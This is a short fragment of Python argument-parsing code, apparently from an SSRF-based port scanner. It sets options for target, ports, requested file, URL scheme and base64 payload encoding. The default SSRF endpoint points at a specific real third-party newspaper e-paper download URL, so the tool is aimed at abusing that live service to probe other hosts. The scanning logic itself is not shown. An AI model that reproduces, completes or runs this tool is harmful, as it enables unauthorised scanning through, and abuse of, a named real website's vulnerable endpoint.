...
parser.add_argument("-p", dest="ports", required=False, help="Ports to scan", default="21,22,23,25,53,80,110,111,135,139,143,443,445,993,995,1723,3306,3389,5900,8080")
parser.add_argument("-f", dest="filereq", required=False, help="File to request", default="/favicon.ico")
parser.add_argument("-t", dest="target", required=True, help="Target to scan", default="127.0.0.1")
parser.add_argument("-m", dest="method", required=False, help="Define method, such as http://, \\ etc", default="https://")
parser.add_argument("-b", dest="pldbase", required=False, action='store_true', help="Base64 the payload", default="False")
parser.add_argument("-s", dest="ssrfurl", required=False, help="SSRF Url", default="https://epaper.ajc.com/html5/reader/get_clipping_download.aspx?b64Url=")
